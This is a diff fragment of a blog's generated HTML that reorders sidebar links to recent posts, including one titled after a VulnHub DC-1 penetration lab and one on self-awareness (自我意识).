@@ -534,28 +533,20 @@ show tables;                #查看当前数据库下的表名
   <li class="item">
     
 <div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/03/12/%E5%88%9D%E5%BF%83/" title="初心">初心</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/03/11/hello-world/" title="Hello World">Hello World</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 <a href="/categories/%E7%BD%91%E5%AE%89/" title="In 网安">网安</a>
 </div>
 
     <span><a href="/2023/03/12/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91/" title="VulnHub靶机渗透之DC:1 【DC系列】">VulnHub靶机渗透之DC:1 【DC系列】</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E8%87%AA%E6%88%91/" title="In 自我">自我</a>
+</div>
+
+    <span><a href="/2023/03/12/%E5%88%9D%E5%BF%83/" title="自我意识">自我意识</a></span>
   </li>
 
   </ul>
